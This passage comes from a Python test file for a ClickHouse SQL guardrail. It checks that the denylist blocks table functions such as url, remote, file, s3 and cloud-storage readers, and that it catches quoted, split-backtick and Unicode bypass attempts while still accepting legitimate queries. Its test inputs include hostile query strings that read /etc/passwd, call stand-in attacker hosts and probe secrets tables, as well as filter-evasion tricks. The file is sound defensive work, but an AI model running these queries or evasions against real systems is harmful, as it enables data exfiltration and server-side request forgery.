        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_s3_base_still_blocked(self):
        exc = _reject("SELECT * FROM s3('s3://bucket/key', 'CSV', 'id Int32')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_remote_base_still_blocked(self):
        exc = _reject("SELECT * FROM remote('attacker.example:9000', 'db.tbl')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_file_base_still_blocked(self):
        exc = _reject("SELECT * FROM file('/etc/passwd', 'CSV', 'line String')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_hdfs_base_still_blocked(self):
        exc = _reject("SELECT * FROM hdfs('hdfs://namenode/path', 'CSV', 'x String')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_clusterallreplicas_still_blocked(self):
        exc = _reject("SELECT * FROM clusterAllReplicas('prod', 'db', 'secrets')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    # -------------------------------------------------------------------
    # FALSE-POSITIVE GUARDS — legitimate queries that share token prefixes
    # with blocked names must still be accepted.
    # -------------------------------------------------------------------

    def test_quantilemerge_aggregate_not_blocked(self):
        """quantileMerge( must NOT be blocked.

        The pattern is \\bmerge\\w*\\( — "merge" inside "quantileMerge" has no
        word boundary before it (it follows 'e' in 'quantil[e]'), so \\b never
        fires and the pattern does not match.
        """
        result = _accept("SELECT quantileMerge(0.5)(q) FROM t")
        assert result

    def test_arrayjoin_range_not_blocked(self):
        """arrayJoin(range(10)) is a normal analytics expression — must pass."""
        result = _accept("SELECT arrayJoin(range(10)) AS n")
        assert result

    def test_settings_column_name_not_blocked(self):
        """A column literally named 'settings' is not a SETTINGS clause — must pass.

        The SETTINGS pattern is \\bSETTINGS\\s+\\w+\\s*= which requires the word
        to be followed by whitespace, an identifier, and '='.  A bare column
        reference or equality check like settings = 'x' does NOT match that form
        because the order is reversed: identifier comes after '=', not before.
        """
        result = _accept("SELECT settings FROM t WHERE settings = 'x'")
        assert result

    def test_url_slug_identifier_not_blocked(self):
        """url_slug is an identifier (no following '(') — must pass."""
        result = _accept("SELECT url_slug, file_size FROM t")
        assert result

    def test_max_aggregate_not_blocked(self):
        """max(value) is a standard aggregate — must not be confused with any denied root."""
        result = _accept("SELECT max(value) FROM t")
        assert result

    def test_normal_select_not_blocked(self):
        """A completely ordinary SELECT must pass cleanly."""
        result = _accept("SELECT a, b FROM db.t WHERE a > 1")
        assert result

    def test_merge_without_parens_not_blocked(self):
        """A table named 'merge' referenced without parentheses must not be blocked.

        The pattern \\bmerge\\w*\\( requires a '(' to follow.  A bare FROM merge
        (without call syntax) does not trigger it.
        """
        result = _accept("SELECT id FROM merge LIMIT 10")
        assert result


# ===========================================================================
# 8. QUOTED-IDENTIFIER BYPASS FIXES — round 2
#
# ClickHouse accepts backtick- and double-quote-quoted identifiers as function
# names.  The \b<root>\w*\s*\( patterns do NOT match quoted forms because the
# closing quote sits between the name and '('.  The fix strips identifier
# quotes from the denylist scan copy so quoted names collapse to their bare
# form and are caught.
# ===========================================================================

class TestQuotedIdentifierBypassFixes:
    """Round-2 regression tests: quoted-function-name bypasses and new cloud table functions."""

    # -------------------------------------------------------------------
    # REJECT — backtick-quoted function names (CRITICAL fix)
    # -------------------------------------------------------------------

    def test_backtick_url_blocked(self):
        """`url`( must be caught after identifier-quote stripping."""
        exc = _reject("SELECT * FROM `url`('http://evil/','CSV','x String')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_double_quote_url_blocked(self):
        '''"url"( must be caught after identifier-quote stripping.'''
        exc = _reject('SELECT * FROM "url"(\'http://evil/\',\'CSV\',\'x String\')')
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_backtick_merge_blocked(self):
        """`merge`('system','.*') must be caught after stripping."""
        exc = _reject("SELECT * FROM `merge`('system','.*')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_backtick_file_blocked(self):
        """`file`('/etc/passwd','TSV','line String') must be caught."""
        exc = _reject("SELECT * FROM `file`('/etc/passwd','TSV','line String')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_backtick_remote_blocked(self):
        """`remote`('attacker:9000','db.secrets') must be caught."""
        exc = _reject("SELECT * FROM `remote`('attacker:9000','db.secrets')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_split_backtick_evasion_blocked(self):
        """u`r`l( — backtick characters mid-name are stripped, reducing to url(."""
        exc = _reject("SELECT * FROM u`r`l('http://x')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    # -------------------------------------------------------------------
    # REJECT — new cloud-storage table functions (HIGH fix)
    # -------------------------------------------------------------------

    def test_oss_table_function_blocked(self):
        """oss( — Alibaba OSS SSRF/exfil vector, must be blocked."""
        exc = _reject("SELECT * FROM oss('oss://b/k','CSV','x String')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_cosn_table_function_blocked(self):
        """cosn( — Tencent COS SSRF/exfil vector, must be blocked."""
        exc = _reject("SELECT * FROM cosn('cosn://b/k','CSV','x String')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_obs_table_function_blocked(self):
        """obs( — Huawei OBS SSRF/exfil vector, must be blocked."""
        exc = _reject("SELECT * FROM obs('obs://b/k','CSV','x String')")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_settings_multi_clause_blocked(self):
        """SETTINGS a=1, readonly=0 — first key triggers the SETTINGS pattern."""
        exc = _reject("SELECT 1 SETTINGS a=1, readonly=0")
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    # -------------------------------------------------------------------
    # ACCEPT — false-positive guards: legitimate quoted column identifiers
    # must NOT be rejected, and the RETURNED SQL must preserve backticks.
    # -------------------------------------------------------------------

    def test_backtick_quoted_column_identifier_accepted(self):
        """Legitimate backtick-quoted column references must pass.

        The denylist normalization strips backticks only from the throwaway scan
        copy; the returned SQL retains them so the query executes correctly.
        """
        result = _accept("SELECT `weird col` FROM t WHERE `weird col` > 1")
        # Must not raise
        assert result
        # The returned SQL must still contain the backtick-quoted identifier
        # so it executes correctly in ClickHouse.
        assert "`weird col`" in result

    def test_view_root_column_no_parens_accepted(self):
        """'viewable' and 'preview' share the 'view' root but have no '(' — must pass."""
        result = _accept("SELECT viewable, preview FROM content")
        assert result

    # -------------------------------------------------------------------
    # REJECT — Unicode homoglyph / compatibility-form function names
    # NFKC normalization folds these to ASCII before pattern matching.
    # -------------------------------------------------------------------

    @pytest.mark.xfail(
        strict=True,
        reason=(
            "NFKC does NOT fold cross-script homoglyphs: Cyrillic U+0443 'у' is a "
            "distinct Unicode character, not a compatibility form of ASCII 'u'. "
            "unicodedata.normalize('NFKC', 'у') == 'у' (unchanged). "
            "Cross-script homograph detection would require a confusables table "
            "(e.g. Unicode TR39) and is out of scope for this guardrail. "
            "This test is xfail(strict=True) to document the known limitation "
            "and alert if behaviour ever changes unexpectedly."
        ),
    )
    def test_cyrillic_homoglyph_url_blocked(self):
        """Cyrillic у (U+0443) + 'rl(' looks like url( visually.

        NFKC does NOT catch this — Cyrillic is a distinct script, not a
        compatibility form.  This test is xfail(strict) to document the gap.
        """
        # U+0443 is Cyrillic small letter 'у'; the rest is plain ASCII.
        cyrillic_url = "уrl"
        sql = f"SELECT * FROM {cyrillic_url}('http://evil/','CSV','x String')"
        exc = _reject(sql)  # expected NOT to raise under current implementation
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_fullwidth_url_blocked(self):
        """Full-width u (U+FF55) + 'rl(' — NFKC folds full-width to ASCII, must be rejected."""
        # U+FF55 is FULLWIDTH LATIN SMALL LETTER U; NFKC normalizes it to 'u'.
        fullwidth_url = "ｕrl"
        sql = f"SELECT * FROM {fullwidth_url}('http://evil/','CSV','x String')"
        exc = _reject(sql)
        assert exc.detail["code"] == "DISALLOWED_KEYWORD"

    def test_unicode_in_string_literal_not_blocked(self):
        """Accented characters inside a string literal must not cause false rejection.

        NFKC normalization runs on stripped_masked (string literals already blanked),
        so accented chars that appear only inside a quoted value are never seen by
        NFKC or the denylist patterns.
        """
        result = _accept("SELECT * FROM t WHERE name = 'café'")
        assert result
